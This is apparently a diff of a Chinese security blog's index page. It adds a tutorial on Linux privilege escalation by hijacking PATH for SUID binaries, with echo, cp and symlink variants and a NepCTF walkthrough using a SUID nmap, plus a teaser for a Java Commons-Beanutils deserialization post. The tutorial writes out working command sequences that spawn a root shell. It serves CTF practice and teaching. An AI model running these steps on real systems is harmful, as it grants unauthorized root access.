+<p>我们利用find命令查找一下具有suid权限的文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现了 &#x2F;home&#x2F;lvxyz&#x2F;script&#x2F;demo   </p>
+<p>我们运行一下这个文件，发现它会执行 ps命令</p>
+<p><img src="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/3074366-20230827011149833-529328313.png"></p>
+<h3 id="1-echo命令"><a href="#1-echo命令" class="headerlink" title="(1) echo命令"></a>(1) echo命令</h3><p>因此 我们就往&#x2F;tmp写入 一个同名文件，内容为 &#x2F;bin&#x2F;bash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/lvxyz/script</span><br><span class="line">./demo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/3074366-20230827011159948-1936550990.png"></p>
+<p>发现成功提权为root</p>
+<h3 id="2-cp命令"><a href="#2-cp命令" class="headerlink" title="(2) cp命令"></a>(2) cp命令</h3><p>也可以通过 cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps，使得&#x2F;tmp&#x2F;ps文件等价于&#x2F;bin&#x2F;bash    与上面同理</p>
+<p><img src="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/3074366-20230827011211083-1755179792.png"></p>
+<p>成功提权root</p>
+<h3 id="3-symlink命令"><a href="#3-symlink命令" class="headerlink" title="(3) symlink命令"></a>(3) symlink命令</h3><p>利用条件：suid权限的文件目录拥有所有权限</p>
+<p>利用 symlink 符号链接命令</p>
+<p><img src="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/3074366-20230827011220721-406060009.png"></p>
+<p>控制环境变量，最开头加上 .  从而控制环境变量  执行ps时优先找到 .&#x2F;ps   即 &#x2F;bin&#x2F;bash 提权</p>
+<p>其他命令同理，比如 c文件里写的 system(“cat &#x2F;etc&#x2F;passwd”)</p>
+<p>我们只需重写一个 内容为&#x2F;bin&#x2F;sh的 cat，然后控制环境变量使得 某个suid权限的文件里在执行 cat命令时，优先找到我们重写的cat即可提权</p>
+<p>关键在于：</p>
+<ul>
+<li>找到具有SUID权限的文件，知道文件里调用了什么系统二进制文件</li>
+<li>环境变量中有自己能控制的路径</li>
+</ul>
+<h2 id="CTF应用-nepctf-独步天下"><a href="#CTF应用-nepctf-独步天下" class="headerlink" title="&lt;5&gt; CTF应用 - nepctf 独步天下"></a>&lt;5&gt; CTF应用 - nepctf 独步天下</h2><p>nc ip port进入环境</p>
+<p>ls &#x2F; 发现了flag 直接读取不行 没有权限</p>
+<p>题目提示：环境变量提权</p>
+<p>查找具有suid权限的文件：<code>find / -perm -u=s -type f</code></p>
+<p>找到了 &#x2F;bin&#x2F;nmap 且其拥有者为root</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x    1 root     root        931712 Jul 17 09:46 nmap</span><br></pre></td></tr></table></figure>
+
+<p>执行一下 发现 nmap里调用了 ports-alive</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin $ nmap 1</span><br><span class="line">nmap 1</span><br><span class="line">sh: ports-alive: not found</span><br></pre></td></tr></table></figure>
+
+<p>环境变量提权，在&#x2F;tmp下创建一个名为 ports-alive 内容为 &#x2F;bin&#x2F;sh 脚本。export &#x2F;tmp到$PATH里最左边。运行&#x2F;bin&#x2F;nmap 时劫持 ports-alive命令，从而以root身份执行&#x2F;bin&#x2F;sh 提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/sh&quot; &gt; ports-alive</span><br><span class="line">chmod +x ports-alive</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/bin/nmap 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/3074366-20230827011234823-1662185281.png"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Java反序列化Commons-Beanutils篇-CB链" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Beanutils%E7%AF%87-CB%E9%93%BE/" target="_blank">Java反序列化Commons-Beanutils篇-CB链</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Beanutils%E7%AF%87-CB%E9%93%BE/" class="archive-article-date">
+        <time datetime="2023-07-30T14:42:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-07-30</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="&lt;1&gt; 环境介绍"></a>&lt;1&gt; 环境介绍</h1><p>jdk：jdk8u65<br>CB：commons-beanutils 1.8.3<br>pom.xml 添加</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+    
+    <a class="article-more-a" href="/2023/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Beanutils%E7%AF%87-CB%E9%93%BE/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">java安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Beanutils%E7%AF%87-CB%E9%93%BE/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 
 
@@ -994,6 +1323,22 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">java安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">工具</a>
               </li>
             
             <div class="clearfix"></div>
